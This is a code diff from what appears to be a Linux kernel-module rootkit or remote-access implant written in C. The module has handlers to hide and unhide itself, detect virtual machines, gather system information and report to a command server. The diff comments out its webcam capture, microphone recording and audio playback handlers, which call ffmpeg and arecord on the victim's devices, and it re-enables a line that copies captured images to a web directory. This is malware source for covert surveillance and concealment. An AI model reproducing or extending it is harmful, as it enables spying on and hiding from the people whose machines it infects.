@@ -37,10 +37,10 @@ static int killcom_handler(char *args, enum Protocol protocol);
 static int hide_module_handler(char *args, enum Protocol protocol);
 static int unhide_module_handler(char *args, enum Protocol protocol);
 static int help_handler(char *args, enum Protocol protocol);
-static int start_webcam_handler(char *args, enum Protocol protocol);
-static int capture_image_handler(char *args, enum Protocol protocol);
-static int start_microphone_handler(char *args, enum Protocol protocol);
-static int play_audio_handler(char *args, enum Protocol protocol);
+// static int start_webcam_handler(char *args, enum Protocol protocol);
+// static int capture_image_handler(char *args, enum Protocol protocol);
+// static int start_microphone_handler(char *args, enum Protocol protocol);
+// static int play_audio_handler(char *args, enum Protocol protocol);
 static int sysinfo_handler(char *args, enum Protocol protocol);
 static int is_in_vm_handler(char *args, enum Protocol protocol);
 
@@ -386,7 +386,7 @@ static int unhide_module_handler(char *args, enum Protocol protocol) {
     return ret_code;
 }
 
-// Command to start the webcam and capture an image
+/*
 static int start_webcam_handler(char *args, enum Protocol protocol) {
     DBG_MSG("start_webcam_handler: starting webcam to capture an image\n");
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
@@ -402,7 +402,6 @@ static int start_webcam_handler(char *args, enum Protocol protocol) {
     return SUCCESS;
 }
 
-// Command to capture an image from the webcam
 static int capture_image_handler(char *args, enum Protocol protocol) {
     DBG_MSG("capture_image_handler: capturing an image from the webcam\n");
     static char *argv[] = { "/usr/bin/ffmpeg", "-f", "v4l2", "-i", "/dev/video0", "-t", "00:00:10", "-s", "640x480", "-f", "image2", "/tmp/capture.jpg", NULL };
@@ -416,7 +415,7 @@ static int capture_image_handler(char *args, enum Protocol protocol) {
     DBG_MSG("capture_image_handler: image captured successfully, saved at /tmp/capture.jpg\n");
     send_to_server(protocol, "Captured image saved at /tmp/capture.jpg\n");
 
-    /*
+    
     // Copy the image to a directory accessible by Flask
     // For example, to /var/www/html/images/ on the server
     int copy_ret_code = system("cp /tmp/capture.jpg /var/www/html/images/capture.jpg");
@@ -424,11 +423,10 @@ static int capture_image_handler(char *args, enum Protocol protocol) {
         ERR_MSG("capture_image_handler: failed to copy image to web accessible directory\n");
         return copy_ret_code;
     }
-    */
+    
     return SUCCESS;
 }
 
-// Command to start recording from the microphone
 static int start_microphone_handler(char *args, enum Protocol protocol) {
     DBG_MSG("start_microphone_handler: starting microphone recording\n");
     static char *argv[] = { "/usr/bin/arecord", "-D", "plughw:1,0", "-f", "cd", "-t", "wav", "-d", "10", "/tmp/audio.wav", NULL };
@@ -444,7 +442,6 @@ static int start_microphone_handler(char *args, enum Protocol protocol) {
     return SUCCESS;
 }
 
-// Command to play an audio file
 static int play_audio_handler(char *args, enum Protocol protocol) {
     DBG_MSG("play_audio_handler: playing audio file from /tmp/audio.wav\n");
     static char *argv[] = { "/usr/bin/aplay", "/tmp/audio.wav", NULL };
@@ -459,6 +456,7 @@ static int play_audio_handler(char *args, enum Protocol protocol) {
     send_to_server(protocol, "Audio played\n");
     return SUCCESS;
 }
+*/
 
 static int sysinfo_handler(char *args, enum Protocol protocol) {
     char *info = get_sysinfo();
